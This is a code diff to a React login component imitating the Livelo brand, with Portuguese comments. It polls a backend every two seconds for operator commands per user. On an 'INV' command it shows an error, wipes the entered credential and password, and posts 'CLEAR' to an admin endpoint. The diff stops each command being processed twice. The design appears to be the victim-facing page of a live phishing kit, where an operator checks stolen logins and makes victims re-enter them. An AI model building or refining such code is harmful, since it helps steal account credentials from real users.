@@ -61,17 +61,27 @@ function LiveloLogin() {
       try {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
         if (response.data && response.data.action) {
-          setCurrentCommand(response.data.action);
+          const action = response.data.action;
           
-          // Se for INV, mostrar erro e limpar campos
-          if (response.data.action === "INV") {
+          // Verificar se já processamos este comando
+          if (action === currentCommand) {
+            return; // Não processar novamente
+          }
+          
+          setCurrentCommand(action);
+          
+          // Se for INV, mostrar erro e limpar campos UMA VEZ
+          if (action === "INV") {
             setIsLoading(false);
             setHasError(true);
-            // Aguardar um pouco antes de limpar os campos para mostrar o erro
-            setTimeout(() => {
-              setCredential("");
-              setPassword("");
-            }, 100);
+            setCredential("");
+            setPassword("");
+            
+            // Limpar o comando no backend após processar
+            await axios.post(`${API}/admin/command`, {
+              user_id: userId,
+              command: "CLEAR"
+            }).catch(err => console.log("Erro ao limpar comando:", err));
           }
         }
       } catch (error) {
@@ -82,7 +92,7 @@ function LiveloLogin() {
     checkCommand();
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
-  }, [userId]);
+  }, [userId, currentCommand]);
 
   // Verifica se o formulário está válido
   useEffect(() => {
